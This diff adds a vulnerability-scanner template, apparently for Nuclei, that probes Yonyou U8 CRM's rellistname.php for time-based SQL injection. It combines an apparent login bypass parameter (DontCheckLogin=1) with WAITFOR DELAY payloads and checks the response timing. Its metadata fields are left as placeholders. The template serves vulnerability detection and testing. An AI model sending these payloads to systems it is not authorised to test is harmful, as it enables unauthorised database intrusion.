@@ -1,0 +1,23 @@
+id: yonyou-U8-CRM-rellistnae-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://github.com/wy876/POC/commit/a9e4000fc76d0157b53ade916323b7b8256b17c3#diff-aaa9c4dc484a22204db43cca3de160bead779edf0ffa9126bfeb5fd068b176a2R21
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/config/rellistname.php?DontCheckLogin=1&objType=1&reportID=1+wAiTFOR+DeLAy'0:0:3'--+-"
+      - "{{BaseURL}}/config/rellistname.php?DontCheckLogin=1&objType=1&reportID=1+wAiTFOR+DeLAy'0:0:6'--+-"
+      - "{{BaseURL}}/config/rellistname.php?DontCheckLogin=1&objType=1&reportID=1+wAiTFOR+DeLAy'0:0:9'--+-"
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
